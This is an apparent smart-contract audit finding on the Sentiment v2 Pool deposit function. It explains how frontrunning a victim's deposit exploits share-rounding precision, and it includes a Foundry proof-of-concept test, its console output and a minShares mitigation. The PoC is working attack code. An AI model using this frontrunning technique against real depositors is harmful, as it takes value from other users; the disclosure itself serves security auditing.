Polished Raspberry Huskie

Medium

# Malicious user can cause pool depositors to receive fewer shares than expected through inflation attack

### Summary

The `deposit` function allows a malicious user to frontrun deposit transactions, causing subsequent depositors to receive fewer shares than expected. This is possible because the `_convertToShares` function can be manipulated by altering the pool's asset-to-shares ratio just before a victim's deposit, leading to a modification in the division precision during their share allocation computation.

### Root Cause

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L304-L331

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L282

The `deposit` function relies on the `_convertToShares` function to calculate the number of shares corresponding to a deposit. However, this calculation is based on the current ratio of `totalDepositAssets` to `totalDepositShares`. The division precision can be manipulated if a malicious user deposits assets just before the victim.
There is already a partial protection against it to make sure the victim does not receive 0 shares. But the victim can still receive less shares than expected.

### Internal pre-conditions

The pool's `asset` and `share` values must not be in a 1:1 ratio, meaning `totalDepositAssets` and `totalDepositShares` must differ due to previous interactions with the pool (e.g., deposits, borrows, and accrued interest).

### External pre-conditions

1. The `maliciousUser` must be able to monitor and detect upcoming deposit transactions from other users.
2. The `maliciousUser` must be able to frontrun these transactions by submitting their own deposit.

### Attack Path

1. The `maliciousUser` monitors the network and detects a planned deposit transaction from another user (`user2`).
2. The `maliciousUser` quickly deposits a small amount of assets into the pool before `user2`'s transaction is mined. This alters the pool’s asset-to-shares ratio just before `user2`’s deposit.
3. When `user2`'s deposit is processed, they receive fewer shares than they would have if the `maliciousUser` had not frontrun their transaction.
4. The `maliciousUser` benefits from a more favorable share allocation at the expense of `user2`.


### Impact

The affected depositor suffers a loss in the form of receiving fewer shares than expected. The protocol does not lose funds directly.

### PoC

Add this to the Pool.t.sol test:

```solidity
    function testPOC() public {
        uint256 assets = 100 ;

        //First we need to interact with the protocol to make assets != shares
        //To do so, we need to deposit, borrow and wait for interest
        vm.prank(poolOwner);
        pool.setPoolCap(linearRatePool, type(uint128).max);
        vm.prank(protocolOwner);
        pool.setInterestFee(linearRatePool, 5e17);

        vm.startPrank(user);
        asset1.mint(user, assets);
        asset1.approve(address(pool), assets);
        
        pool.deposit(linearRatePool, assets, user);
        vm.stopPrank();

        vm.prank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
        pool.borrow(linearRatePool, user, 80 );
        skip(1 days);

        //Now we save the state and do the two cases
        uint256 snapshot = vm.snapshot();

        //Do a normal deposit without being front-run
        vm.startPrank(user2);
        asset1.mint(user2, assets);
        asset1.approve(address(pool), assets);
        
        pool.deposit(linearRatePool, assets, user2);
        console.log("Shares of user2 (normal): ", pool.balanceOf(user2, linearRatePool));
        vm.stopPrank();
        
        //Do a deposit being front run by a malicious user
        vm.revertTo(snapshot);
        address user3 = makeAddr("user3");
        vm.startPrank(user3);
        asset1.mint(user3, 30);
        asset1.approve(address(pool), 30);
        pool.deposit(linearRatePool, 30, user3);
        vm.stopPrank();

        vm.startPrank(user2);
        asset1.mint(user2, assets);
        asset1.approve(address(pool), assets);
        pool.deposit(linearRatePool, assets, user2);
        console.log("Shares of user2 (with a front run): ", pool.balanceOf(user2, linearRatePool));
        vm.stopPrank();
    }
```

Here is the console result when `forge test --match-test POC`:

```bash
  Shares of user2 (normal):  99
  Shares of user2 (with a front run):  98
```



### Mitigation

To mitigate this issue, the protocol could add an input variable on the deposit function (for example: `uint256 minShares`).

When calculating the receive shares, if it is less than `minShares`, it reverts. In that way, the user make sure to receive expected shares.